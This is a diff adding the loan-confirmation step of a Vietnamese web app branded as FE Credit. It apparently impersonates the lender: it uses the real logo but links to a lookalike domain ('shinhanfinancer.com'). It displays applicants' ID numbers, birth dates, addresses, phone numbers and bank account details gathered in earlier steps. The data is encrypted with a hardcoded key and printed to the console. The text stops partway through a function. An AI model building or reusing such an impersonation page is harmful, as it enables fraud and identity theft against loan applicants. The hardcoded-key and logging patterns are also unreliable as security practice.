@@ -1,0 +1,1333 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FE Credit - Xác nhận khoản vay</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <!-- Step 1 Style Guide -->
+    <link rel="stylesheet" href="step1-style-guide.css">
+    <style>
+      :root {
+        /* FE Credit Design System Colors */
+        --fecredit-primary: #00994F;
+        --fecredit-primary-hover: #015C2E;
+        --fecredit-primary-light: #9FE870;
+        --fecredit-primary-dark: #015C2E;
+        --fecredit-success: #00994F;
+        --fecredit-white: #ffffff;
+        --fecredit-text-primary: #212529;
+        --fecredit-text-secondary: #5a6a85;
+        --fecredit-border: #ECECEC;
+        --fecredit-bg-primary: #ffffff;
+        --fecredit-bg-secondary: #f8f9fc;
+        --fecredit-light-bg: #E8F8EE;
+        --fecredit-error: #e53e3e;
+        
+        /* Legacy aliases for compatibility */
+        --primary-color: var(--fecredit-primary);
+        --primary-hover-color: var(--fecredit-primary-hover);
+        --success-color: var(--fecredit-success);
+        --light-bg: var(--fecredit-light-bg);
+        --border-color: var(--fecredit-border);
+        --text-primary: var(--fecredit-text-primary);
+        --text-secondary: var(--fecredit-text-secondary);
+        --white-color: var(--fecredit-white);
+        --body-bg: var(--fecredit-bg-secondary);
+        --danger-color: var(--fecredit-error);
+        --border-radius-lg: 1.5rem;
+        --border-radius-md: 1rem;
+        --border-radius-sm: 0.5rem;
+        --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+        --shadow-md: 0 4px 6px -1px rgba(0, 153, 79, 0.1), 0 2px 4px -2px rgba(0, 153, 79, 0.1);
+        --shadow-lg: 0 10px 15px -3px rgba(0, 153, 79, 0.1), 0 4px 6px -4px rgba(0, 153, 79, 0.1);
+        --spacing-xs: 8px;
+        --spacing-sm: 12px;
+        --spacing-md: 16px;
+        --spacing-lg: 24px;
+        --spacing-xl: 32px;
+        --touch-target: 48px;
+        
+        /* FE Credit Typography */
+        --fecredit-font-family-primary: 'Inter', 'Be Vietnam Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        --fecredit-font-weight-normal: 400;
+        --fecredit-font-weight-medium: 500;
+        --fecredit-font-weight-semibold: 600;
+        --fecredit-font-weight-bold: 700;
+      }
+
+      /* Progress Stepper */
+      .progress-stepper-wrapper {
+        background: var(--white-color);
+        box-shadow: var(--shadow-sm);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+        padding: var(--spacing-md) var(--spacing-sm);
+        margin-bottom: var(--spacing-lg);
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      .progress-stepper {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-width: 600px;
+        margin: 0 auto;
+        max-width: 900px;
+      }
+
+      .stepper-step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: var(--spacing-xs);
+        min-width: 60px;
+      }
+
+      .stepper-circle {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: var(--border-color);
+        color: var(--text-secondary);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+        font-size: 0.875rem;
+        transition: all 0.3s ease;
+      }
+
+      .stepper-step.completed .stepper-circle {
+        background: var(--fecredit-primary);
+        color: var(--fecredit-white);
+      }
+
+      .stepper-step.active .stepper-circle {
+        background: var(--fecredit-primary);
+        color: var(--fecredit-white);
+        box-shadow: 0 0 0 4px rgba(0, 153, 79, 0.2);
+      }
+
+      .stepper-label {
+        font-size: 0.75rem;
+        color: var(--text-secondary);
+        font-weight: 500;
+        white-space: nowrap;
+        text-align: center;
+      }
+
+      .stepper-step.completed .stepper-label,
+      .stepper-step.active .stepper-label {
+        color: var(--text-primary);
+        font-weight: 600;
+      }
+
+      .stepper-line {
+        height: 2px;
+        flex: 1;
+        background: var(--border-color);
+        min-width: 30px;
+        transition: all 0.3s ease;
+      }
+
+      .stepper-line.completed {
+        background: var(--fecredit-primary);
+      }
+
+      .stepper-line.active {
+        background: linear-gradient(90deg, var(--fecredit-primary) 0%, var(--fecredit-border) 100%);
+      }
+
+      body {
+        font-family: var(--fecredit-font-family-primary);
+        background-color: var(--fecredit-bg-secondary);
+        color: var(--fecredit-text-primary);
+      }
+      .header {
+        background-color: var(--fecredit-bg-primary);
+        border-bottom: 1px solid var(--fecredit-border);
+        box-shadow: var(--shadow-sm);
+      }
+      .navbar-brand img {
+        height: 32px;
+      }
+      .content-card {
+        background-color: var(--fecredit-bg-primary);
+        padding: var(--fecredit-spacing-lg);
+        border-radius: var(--fecredit-radius-md);
+        border: 1px solid var(--fecredit-border);
+        box-shadow: var(--fecredit-shadow-sm);
+        margin-bottom: var(--fecredit-spacing-lg);
+      }
+      .card-title-group {
+        display: flex;
+        align-items: center;
+        margin-bottom: 1.5rem;
+      }
+      .card-title-group .icon {
+        color: var(--fecredit-primary);
+        margin-right: var(--fecredit-spacing-md);
+        font-size: 1.25rem;
+        width: 44px;
+        height: 44px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        background-color: var(--fecredit-light-bg);
+        border-radius: 50%;
+        flex-shrink: 0;
+      }
+      .card-title-group .title {
+        font-size: 1.25rem;
+        font-weight: var(--fecredit-font-weight-bold);
+        margin-bottom: 0;
+        color: var(--fecredit-text-primary);
+      }
+      .info-list {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+      }
+      .info-list-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: var(--fecredit-spacing-md) var(--fecredit-spacing-sm);
+        border-bottom: 1px solid var(--fecredit-border);
+        transition: background-color 0.2s ease;
+      }
+      .info-list-item:hover {
+        background-color: var(--fecredit-light-bg);
+      }
+      .info-list-item:last-child {
+        border-bottom: none;
+      }
+      .info-list-item .label {
+        font-size: var(--fecredit-font-size-base);
+        color: var(--fecredit-text-secondary);
+        font-weight: var(--fecredit-font-weight-medium);
+        flex: 1;
+      }
+      .info-list-item .value {
+        font-size: var(--fecredit-font-size-base);
+        color: var(--fecredit-text-primary);
+        font-weight: var(--fecredit-font-weight-semibold);
+        text-align: right;
+        flex: 1;
+        min-width: 150px;
+      }
+      .info-list-item .value.currency {
+        font-weight: var(--fecredit-font-weight-bold);
+        color: var(--fecredit-primary);
+        font-family: var(--fecredit-font-family-primary);
+      }
+
+      .info-list-separator {
+        height: 1px;
+        background: var(--fecredit-border);
+        margin: 16px 0;
+        list-style: none;
+        padding: 0;
+      }
+      .app-container {
+        padding: 1rem 1rem 100px 1rem;
+      }
+      .calculation-table {
+        margin-top: 15px;
+        font-size: 14px;
+        width: 100%;
+        border-collapse: collapse;
+      }
+      .calculation-table th,
+      .calculation-table td {
+        padding: 6px;
+        text-align: center;
+        border: 1px solid var(--border-color);
+      }
+      .calculation-table th {
+        background: var(--fecredit-light-bg);
+        font-weight: var(--fecredit-font-weight-medium);
+        color: var(--fecredit-text-primary);
+      }
+      .collapsible-header {
+        cursor: pointer;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px;
+        background: var(--fecredit-light-bg);
+        border-radius: var(--border-radius-md);
+        margin-top: 20px;
+      }
+      .collapsible-header h4 {
+        margin: 0;
+        font-size: 1.1rem;
+        font-weight: 600;
+      }
+      .collapsible-header .toggle-icon {
+        transition: transform 0.3s ease;
+      }
+      .collapsible-header[aria-expanded="true"] .toggle-icon {
+        transform: rotate(180deg);
+      }
+      @media (max-width: 767px) {
+        .app-container {
+          padding-top: 2rem;
+        }
+        .content-card {
+          padding: 2rem;
+        }
+        .calculation-table {
+          display: block;
+          font-size: 12px;
+        }
+        .calculation-table thead {
+          display: none;
+        }
+        .calculation-table tbody tr {
+          display: flex;
+          flex-wrap: wrap;
+          padding: 8px 0;
+          border-bottom: 1px solid var(--border-color);
+        }
+        .calculation-table tbody td {
+          flex: 1 1 100%;
+          padding: 4px;
+          text-align: left;
+          display: flex;
+          justify-content: space-between;
+          font-size: 11px;
+        }
+        .calculation-table tbody td:before {
+          content: attr(data-label);
+          font-weight: 500;
+          color: var(--text-primary);
+          display: block;
+          flex: 0 0 35%;
+        }
+        .calculation-table tbody td:nth-child(1):before {
+          content: "Tháng: ";
+        }
+        .calculation-table tbody td:nth-child(2):before {
+          content: "Gốc: ";
+        }
+        .calculation-table tbody td:nth-child(3):before {
+          content: "Lãi: ";
+        }
+        .calculation-table tbody td:nth-child(4):before {
+          content: "Tổng: ";
+        }
+        .calculation-table tbody td:nth-child(5):before {
+          content: "Dư nợ: ";
+        }
+      }
+      #processing-overlay,
+      #loading-view {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(248, 249, 250, 0.95);
+        z-index: 2000;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s ease-in-out;
+      }
+      #loading-view {
+        background: linear-gradient(-45deg, var(--fecredit-light-bg), var(--fecredit-bg-secondary), #e6efff, var(--fecredit-bg-secondary));
+        background-size: 400% 400%;
+        animation: gradientBG 15s ease infinite;
+      }
+      @keyframes gradientBG {
+        0% {
+          background-position: 0% 50%;
+        }
+        50% {
+          background-position: 100% 50%;
+        }
+        100% {
+          background-position: 0% 50%;
+        }
+      }
+      #processing-overlay.show,
+      #loading-view.show {
+        opacity: 1;
+        visibility: visible;
+      }
+      #processing-overlay .spinner-border,
+      #loading-view .spinner-border {
+        width: 4rem;
+        height: 4rem;
+        border-color: rgba(0, 153, 79, 0.2);
+        border-right-color: var(--fecredit-primary);
+      }
+      .btn {
+        transition: all 0.2s ease-in-out;
+        border-radius: 12px;
+        font-weight: 600;
+        padding: 0.8rem 1.5rem;
+        min-height: var(--touch-target);
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .btn-primary {
+        background-color: var(--fecredit-primary);
+        border-color: var(--fecredit-primary);
+        color: var(--fecredit-white);
+        box-shadow: var(--shadow-md);
+        font-weight: var(--fecredit-font-weight-semibold);
+        font-family: var(--fecredit-font-family-primary);
+      }
+      .btn-primary:hover {
+        background-color: var(--fecredit-primary-dark);
+        border-color: var(--fecredit-primary-dark);
+        transform: translateY(-2px);
+        box-shadow: var(--shadow-lg);
+      }
+      .btn-primary:disabled {
+        background-color: #d1d5db;
+        border-color: #d1d5db;
+        color: #9ca3af;
+        cursor: not-allowed;
+        box-shadow: none;
+        transform: none;
+      }
+      .form-check.is-invalid .form-check-label {
+        color: var(--danger-color);
+      }
+      .form-check.is-invalid {
+        animation: shake 0.5s;
+      }
+      @keyframes shake {
+        10%,
+        90% {
+          transform: translate3d(-1px, 0, 0);
+        }
+        20%,
+        80% {
+          transform: translate3d(2px, 0, 0);
+        }
+        30%,
+        50%,
+        70% {
+          transform: translate3d(-4px, 0, 0);
+        }
+        40%,
+        60% {
+          transform: translate3d(4px, 0, 0);
+        }
+      }
+
+      /* Validation & Accessibility */
+      .form-validation-summary {
+        background: #fff3cd;
+        border: 1px solid #ffc107;
+        border-radius: var(--border-radius-sm);
+        padding: var(--spacing-md);
+        margin-bottom: var(--spacing-md);
+        color: #856404;
+      }
+
+      .form-validation-summary.collapsible {
+        cursor: pointer;
+      }
+
+      .form-validation-summary h4 {
+        margin: 0 0 var(--spacing-sm) 0;
+        font-size: 1rem;
+        font-weight: 600;
+      }
+
+      .form-validation-summary ul {
+        margin: 0;
+        padding-left: 20px;
+      }
+
+      .invalid-feedback {
+        color: var(--danger-color);
+        font-size: 0.875rem;
+        margin-top: 4px;
+        display: none;
+      }
+
+      .invalid-feedback.show {
+        display: block;
+      }
+
+      /* Screen reader only */
+      .sr-only {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border-width: 0;
+      }
+
+      /* Responsive improvements */
+      @media (max-width: 767px) {
+        .app-container {
+          padding: 12px !important;
+        }
+        
+        .content-card {
+          padding: 20px 16px !important;
+          border-radius: 12px !important;
+        }
+        
+        .card-title-group .title {
+          font-size: 1.1rem !important;
+        }
+        
+        .info-list-item {
+          padding: 12px 8px !important;
+          flex-direction: column;
+          align-items: flex-start;
+          gap: 8px;
+        }
+        
+        .info-list-item .label {
+          font-size: 0.9rem !important;
+        }
+        
+        .info-list-item .value {
+          font-size: 0.95rem !important;
+          text-align: left !important;
+        }
+        
+        .collapsible-header {
+          padding: 12px !important;
+        }
+        
+        .collapsible-header h4 {
+          font-size: 1rem !important;
+        }
+        
+        .calculation-table {
+          font-size: 11px !important;
+        }
+        
+        .btn {
+          width: 100% !important;
+          min-height: 48px !important;
+          font-size: 15px !important;
+        }
+        
+        .progress-stepper-wrapper {
+          padding: var(--spacing-sm);
+          overflow-x: auto;
+        }
+
+        .progress-stepper {
+          justify-content: flex-start;
+          min-width: 500px;
+        }
+
+        .stepper-label {
+          font-size: 0.625rem;
+        }
+
+        .stepper-circle {
+          width: 36px;
+          height: 36px;
+          font-size: 0.75rem;
+        }
+      }
+
+      @keyframes shake {
+        10%,
+        90% {
+          transform: translate3d(-1px, 0, 0);
+        }
+        20%,
+        80% {
+          transform: translate3d(2px, 0, 0);
+        }
+        30%,
+        50%,
+        70% {
+          transform: translate3d(-4px, 0, 0);
+        }
+        40%,
+        60% {
+          transform: translate3d(4px, 0, 0);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Banner đã bị xóa để form gọn hơn -->
+    
+    <!-- Steps Progress -->
+    <div class="steps" role="progressbar" aria-label="Registration Progress">
+      <div class="step" id="step1">1. THÔNG TIN CÁ NHÂN</div>
+      <div class="step" id="step2">2. THÔNG TIN KHOẢN VAY</div>
+      <div class="step active" id="step3" aria-current="step">3. XÁC THỰC eKYC</div>
+    </div>
+    
+    <!-- Progress Stepper (Internal process) -->
+    <div class="progress-stepper-wrapper">
+      <div class="progress-stepper">
+        <div class="stepper-step completed">
+          <div class="stepper-circle">1</div>
+          <div class="stepper-label">Thông tin</div>
+        </div>
+        <div class="stepper-line completed"></div>
+        <div class="stepper-step completed">
+          <div class="stepper-circle">2</div>
+          <div class="stepper-label">eKYC</div>
+        </div>
+        <div class="stepper-line completed"></div>
+        <div class="stepper-step completed">
+          <div class="stepper-circle">3</div>
+          <div class="stepper-label">Chụp ảnh</div>
+        </div>
+        <div class="stepper-line completed"></div>
+        <div class="stepper-step completed">
+          <div class="stepper-circle">4</div>
+          <div class="stepper-label">Xét duyệt</div>
+        </div>
+        <div class="stepper-line active"></div>
+        <div class="stepper-step active">
+          <div class="stepper-circle">5</div>
+          <div class="stepper-label">Xác nhận</div>
+        </div>
+        <div class="stepper-line"></div>
+        <div class="stepper-step">
+          <div class="stepper-circle">6</div>
+          <div class="stepper-label">Giải ngân</div>
+        </div>
+      </div>
+    </div>
+
+    <header class="header desktop-only">
+      <nav class="navbar navbar-expand-lg">
+        <div class="container">
+          <a class="navbar-brand" href="www.shinhanfinancer.com/"
+            ><img
+              src="https://fecredit.com.vn/public/themes/fecredit/img/fecredit-logo.png"
+              alt="FE Credit Logo"
+          /></a>
+        </div>
+      </nav>
+    </header>
+
+    <div class="app-container container">
+      <!-- Aria live region for announcements -->
+      <div class="sr-only" aria-live="polite" aria-atomic="true" id="announcements"></div>
+      
+      <div class="row justify-content-center">
+        <div class="col-lg-8" id="main-content" style="display: none">
+          <div class="content-card">
+            <div class="card-title-group">
+              <div class="icon"><i class="fas fa-file-invoice-dollar"></i></div>
+              <h3 class="title">Chi tiết Khoản vay</h3>
+            </div>
+            <ul class="info-list" id="loan-details-list"></ul>
+            <div
+              class="collapsible-header"
+              data-bs-toggle="collapse"
+              data-bs-target="#calculation-collapse"
+              aria-expanded="false"
+            >
+              <h4>Bảng tính toán chi tiết</h4>
+              <i class="fas fa-chevron-down toggle-icon"></i>
+            </div>
+            <div class="collapse" id="calculation-collapse">
+              <table class="calculation-table">
+                <thead>
+                  <tr>
+                    <th data-label="Tháng">Tháng</th>
+                    <th data-label="Gốc">Gốc (đồng)</th>
+                    <th data-label="Lãi">Lãi (đồng)</th>
+                    <th data-label="Tổng">Tổng (đồng)</th>
+                    <th data-label="Dư nợ">Dư nợ (đồng)</th>
+                  </tr>
+                </thead>
+                <tbody id="calculation-table"></tbody>
+              </table>
+            </div>
+          </div>
+
+          <div class="content-card">
+            <div class="card-title-group">
+              <div class="icon"><i class="fas fa-check-to-slot"></i></div>
+              <h3 class="title">Xác nhận & Điều khoản</h3>
+            </div>
+            <div class="form-check p-3">
+              <input
+                class="form-check-input"
+                type="checkbox"
+                id="contract-consent"
+              />
+              <label class="form-check-label" for="contract-consent"
+                >Tôi xác nhận các thông tin trên là chính xác và đồng ý với
+                <a
+                  href="dieu-khoan-su-dung.html"
+                  class="fw-bold text-decoration-none"
+                  style="color: var(--fecredit-primary)"
+                  >điều khoản và điều kiện</a
+                >.</label
+              >
+            </div>
+          </div>
+
+          <button
+            id="sign-btn"
+            class="btn btn-primary btn-lg w-100 position-relative"
+          >
+            <span class="btn-text">Xác nhận & Giải ngân</span>
+          </button>
+        </div>
+
+        <div
+          id="global-error"
+          class="alert alert-danger"
+          style="display: none"
+        ></div>
+      </div>
+    </div>
+
+    <div id="loading-view">
+      <div class="spinner-border" role="status">
+        <span class="visually-hidden">Đang tải...</span>
+      </div>
+      <h4 class="mt-4 fw-bold">Đang tải hợp đồng của bạn</h4>
+      <p class="text-secondary mt-2 fs-5">Vui lòng chờ trong giây lát...</p>
+    </div>
+
+    <div id="processing-overlay">
+      <div class="spinner-border" role="status">
+        <span class="visually-hidden">Loading...</span>
+      </div>
+      <h4 class="mt-4 fw-bold">Đang xử lý khoản vay</h4>
+      <p class="text-secondary mt-2 fs-5">
+        Vui lòng chờ trong giây lát và không đóng trình duyệt.
+      </p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+      import {
+        getAuth,
+        signInAnonymously,
+        signInWithCustomToken,
+        onAuthStateChanged,
+      } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+      import {
+        getFirestore,
+        doc,
+        getDoc,
+        setDoc,
+      } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+      const firebaseConfigString =
+        typeof __firebase_config !== "undefined" ? __firebase_config : null;
+      let isDemoMode = true;
+      let firebaseConfig = null;
+      if (
+        firebaseConfigString &&
+        firebaseConfigString.trim() !== "" &&
+        !firebaseConfigString.includes("DEMO_KEY") &&
+        !firebaseConfigString.includes("YOUR_FIREBASE_CONFIG")
+      ) {
+        try {
+          const parsedConfig = JSON.parse(firebaseConfigString);
+          if (
+            parsedConfig.apiKey &&
+            parsedConfig.authDomain &&
+            parsedConfig.projectId
+          ) {
+            firebaseConfig = parsedConfig;
+            isDemoMode = false;
+          }
+        } catch (e) {
+          console.error("Lỗi phân tích cú pháp cấu hình Firebase:", e);
+          isDemoMode = true;
+        }
+      }
+
+      const appId =
+        typeof __app_id !== "undefined" ? __app_id : "default-loan-app";
+
+      const ui = {
+        mainContent: document.getElementById("main-content"),
+        loadingView: document.getElementById("loading-view"),
+        loanDetailsList: document.getElementById("loan-details-list"),
+        consentCheck: document.getElementById("contract-consent"),
+        signBtn: document.getElementById("sign-btn"),
+        globalError: document.getElementById("global-error"),
+        processingOverlay: document.getElementById("processing-overlay"),
+        calculationTable: document.getElementById("calculation-table"),
+      };
+
+      async function main() {
+        ui.loadingView.classList.add("show");
+        try {
+          let loanData = await loadLoanData();
+          populateUI(loanData);
+          setupEventListeners();
+          ui.loadingView.classList.remove("show");
+          ui.mainContent.style.display = "block";
+        } catch (error) {
+          console.error("Lỗi khởi động ứng dụng:", error);
+          displayGlobalError(
+            "Không thể tải dữ liệu khoản vay. Vui lòng quay lại <a href='step1.html'>Bước 1</a> để nhập thông tin."
+          );
+        }
+      }
+
+      function calculateLoanDetails(loanAmount, loanTerm, interestRate) {
+        if (
+          !loanAmount ||
+          !loanTerm ||
+          !interestRate ||
+          loanAmount <= 0 ||
+          loanTerm <= 0 ||
+          interestRate <= 0
+        ) {
+          console.warn("Dữ liệu không đủ để tính toán:", {
+            loanAmount,
+            loanTerm,
+            interestRate,
+          });
+          return {
+            monthlyPayment: 0,
+            totalInterest: 0,
+            totalRepay: 0,
+            tableData: [],
+          };
+        }
+
+        const monthlyRate = interestRate / 100 / 12;
+        const monthlyPayment =
+          (loanAmount * monthlyRate * Math.pow(1 + monthlyRate, loanTerm)) /
+          (Math.pow(1 + monthlyRate, loanTerm) - 1);
+        const totalRepay = monthlyPayment * loanTerm;
+        const totalInterest = totalRepay - loanAmount;
+
+        let balance = loanAmount;
+        const tableData = [];
+        for (let month = 1; month <= loanTerm; month++) {
+          const interest = balance * monthlyRate;
+          const principal = monthlyPayment - interest;
+          balance -= principal;
+          tableData.push({
+            month,
+            principal: Math.floor(principal),
+            interest: Math.floor(interest),
+            total: Math.floor(monthlyPayment),
+            balance: Math.max(0, Math.floor(balance)),
+          });
+        }
+
+        return {
+          monthlyPayment: isNaN(monthlyPayment)
+            ? 0
+            : Math.floor(monthlyPayment),
+          totalInterest: isNaN(totalInterest) ? 0 : Math.floor(totalInterest),
+          totalRepay: isNaN(totalRepay) ? 0 : Math.floor(totalRepay),
+          tableData,
+        };
+      }
+
+      function loadFromLocalStorage() {
+        try {
+          const storedData = localStorage.getItem("userData");
+          if (!storedData) {
+            console.warn("Không tìm thấy dữ liệu trong localStorage.");
+            return {
+              // Step 1 fields
+              fullName: "Chưa cung cấp",
+              dob: "",
+              gender: "",
+              contactAddress: "",
+              cccd: "",
+              issuePlace: "",
+              phone: "",
+              email: "",
+              // Step 2 fields
+              loanType: "",
+              loanAmount: 0,
+              loanTerm: 0,
+              interestRate: 0,
+              purpose: "",
+              monthlyIncome: 0,
+              occupation: "",
+              accountName: "",
+              accountNumber: "",
+              bankName: "",
+              // Payment fields
+              disbursementDate: "Chưa cung cấp",
+              monthlyPayment: 0,
+              totalInterest: 0,
+              totalRepay: 0,
+            };
+          }
+
+          let userData;
+          try {
+            const decryptedData = CryptoJS.AES.decrypt(
+              storedData,
+              "fecredit-secret-key"
+            ).toString(CryptoJS.enc.Utf8);
+            userData = JSON.parse(decryptedData);
+          } catch (e) {
+            console.error("Lỗi giải mã dữ liệu từ localStorage:", e);
+            return {
+              fullName: "Chưa cung cấp",
+              loanAmount: 0,
+              loanTerm: 0,
+              interestRate: 0,
+              disbursementDate: "Chưa cung cấp",
+              monthlyPayment: 0,
+              totalInterest: 0,
+              totalRepay: 0,
+            };
+          }
+          console.log("Dữ liệu từ localStorage:", userData);
+
+          let loanAmount = 0;
+          if (userData.loanAmount === "other" && userData.customLoanAmount) {
+            loanAmount =
+              parseFloat(userData.customLoanAmount.replace(/,/g, "")) || 0;
+          } else {
+            loanAmount = parseFloat(userData.loanAmount.replace(/,/g, "")) || 0;
+          }
+
+          let loanData = {
+            // Step 1 fields
+            fullName: userData.fullName || "Chưa cung cấp",
+            dob: userData.dob || "",
+            gender: userData.gender || "",
+            contactAddress: userData.contactAddress || "",
+            cccd: userData.cccd || "",
+            issuePlace: userData.issuePlace || "",
+            phone: userData.phone || "",
+            email: userData.email || "",
+            // Step 2 fields
+            loanType: userData.loanType || "",
+            loanAmount: loanAmount,
+            loanTerm: parseInt(userData.loanTerm) || 0,
+            interestRate: parseFloat(userData.interestRate) || 0,
+            purpose: userData.purpose || "",
+            monthlyIncome: parseFloat(userData.monthlyIncome) || 0,
+            occupation: userData.occupation || "",
+            accountName: userData.accountName || "",
+            accountNumber: userData.accountNumber || "",
+            bankName: userData.bankName || "",
+            // Payment fields
+            disbursementDate:
+              userData.disbursementDate &&
+              /^\d{4}-\d{2}-\d{2}$/.test(userData.disbursementDate)
+                ? userData.disbursementDate
+                : "Chưa cung cấp",
+            monthlyPayment: parseFloat(userData.monthlyPayment) || 0,
+            totalInterest: parseFloat(userData.totalInterest) || 0,
+            totalRepay: parseFloat(userData.totalRepay) || 0,
+          };
+
+          const paymentFields = [
+            "monthlyPayment",
+            "totalInterest",
+            "totalRepay",
+          ];
+          const arePaymentsInvalid = paymentFields.some(
+            (field) => isNaN(loanData[field]) || loanData[field] <= 0
+          );
+          if (
+            arePaymentsInvalid &&
+            loanData.loanAmount > 0 &&
+            loanData.loanTerm > 0 &&
+            loanData.interestRate > 0
+          ) {
+            console.log("Tính toán lại các trường thanh toán:", paymentFields);
+            const calculated = calculateLoanDetails(
+              loanData.loanAmount,
+              loanData.loanTerm,
+              loanData.interestRate
+            );
+            loanData.monthlyPayment = calculated.monthlyPayment;
+            loanData.totalInterest = calculated.totalInterest;
+            loanData.totalRepay = calculated.totalRepay;
+            loanData.tableData = calculated.tableData;
+          } else {
+            loanData.tableData = calculateLoanDetails(
+              loanData.loanAmount,
+              loanData.loanTerm,
+              loanData.interestRate
+            ).tableData;
+          }
+
+          const numericFields = [
+            "loanAmount",
+            "loanTerm",
+            "interestRate",
+            "monthlyPayment",
+            "totalInterest",
+            "totalRepay",
+          ];
+          numericFields.forEach((field) => {
+            if (isNaN(loanData[field]) || loanData[field] <= 0) {
+              console.warn(
+                `Giá trị không hợp lệ cho ${field}: ${loanData[field]}`
+              );
+            }
+          });
+
+          console.log("Dữ liệu đã xử lý từ localStorage:", loanData);
+          return loanData;
+        } catch (error) {
+          console.error("Lỗi đọc dữ liệu từ localStorage:", error);
+          return {
+            fullName: "Chưa cung cấp",
+            dob: "",
+            gender: "",
+            contactAddress: "",
+            cccd: "",
+            issuePlace: "",
+            phone: "",
+            email: "",
+            loanType: "",
+            loanAmount: 0,
+            loanTerm: 0,
+            interestRate: 0,
+            purpose: "",
+            monthlyIncome: 0,
+            occupation: "",
+            accountName: "",
+            accountNumber: "",
+            bankName: "",
+            disbursementDate: "Chưa cung cấp",
+            monthlyPayment: 0,
+            totalInterest: 0,
+            totalRepay: 0,
+            tableData: [],
+          };
+        }
+      }
+
+      async function loadLoanData() {
+        const localData = loadFromLocalStorage();
+        const criticalFields = ["loanAmount", "loanTerm"];
+        const invalidFields = criticalFields.filter(
+          (field) => isNaN(localData[field]) || localData[field] <= 0
+        );
+        if (invalidFields.length > 0) {
+          console.warn("Dữ liệu khoản vay không đầy đủ:", invalidFields);
+          displayGlobalError(
+            "Dữ liệu khoản vay không đầy đủ. Vui lòng quay lại <a href='step1.html'>Bước 1</a> để nhập lại thông tin."
+          );
+        }
+        return localData;
+      }
+
+      async function initFirebase() {
+        if (isDemoMode) {
+          console.warn("Chế độ Demo: Bỏ qua kết nối Firebase.");
+          userId = "demo-user-123";
+          return;
+        }
+
+        try {
+          const app = initializeApp(firebaseConfig);
+          db = getFirestore(app);
+          auth = getAuth(app);
+
+          await new Promise((resolve, reject) => {
+            const unsubscribe = onAuthStateChanged(
+              auth,
+              async (user) => {
+                unsubscribe();
+                if (user) {
+                  userId = user.uid;
+                  return resolve();
+                }
+                const token =
+                  typeof __initial_auth_token !== "undefined"
+                    ? __initial_auth_token
+                    : null;
+                if (token) {
+                  try {
+                    await signInWithCustomToken(auth, token);
+                    userId = auth.currentUser.uid;
+                    resolve();
+                  } catch (e) {
+                    reject(new Error("Token xác thực không hợp lệ."));
+                  }
+                } else {
+                  await signInAnonymously(auth);
+                  userId = auth.currentUser.uid;
+                  resolve();
+                }
+              },
+              reject
+            );
+          });
+        } catch (error) {
+          console.error("Lỗi khởi tạo Firebase:", error);
+          throw new Error("Không thể kết nối đến dịch vụ xác thực.");
+        }
+      }
+
+      function formatCurrency(num) {
+        if (typeof num !== "number" || isNaN(num) || num <= 0) return "0 VNĐ";
+        return num.toLocaleString("vi-VN") + " VNĐ";
+      }
+
+      function formatDate(dateString) {
+        if (!dateString || dateString === "Chưa cung cấp") return "Chưa cung cấp";
+        try {
+          // Handle different date formats
+          let date;
+          if (dateString.includes('/')) {
+            // Format: dd/mm/yyyy
+            const parts = dateString.split('/');
+            date = new Date(parts[2], parts[1] - 1, parts[0]);
+          } else if (dateString.includes('-')) {
+            // Format: yyyy-mm-dd
+            date = new Date(dateString);
+          } else {
+            return dateString;
+          }
+          return date.toLocaleDateString("vi-VN", {
+            day: "2-digit",
+            month: "2-digit",
+            year: "numeric"
+          });
+        } catch (e) {
+          return dateString;
+        }
+      }
+
+      function populateUI(data) {
+        // Group 1: Thông tin cá nhân (Step 1)
+        const personalInfo = [
+          { label: "Họ và Tên", value: data.fullName || "Chưa cung cấp" },
+          { label: "Ngày sinh", value: formatDate(data.dob) },
+          { label: "Giới tính", value: data.gender || "Chưa cung cấp" },
+          { label: "Địa chỉ thường trú", value: data.contactAddress || "Chưa cung cấp" },
+          { label: "Số CMND/CCCD", value: data.cccd || "Chưa cung cấp" },
+          { label: "Nơi cấp CMND/CCCD", value: data.issuePlace || "Chưa cung cấp" },
+          { label: "Số điện thoại", value: data.phone || "Chưa cung cấp" },
+          { label: "Email", value: data.email || "Chưa cung cấp" },
+        ];
+
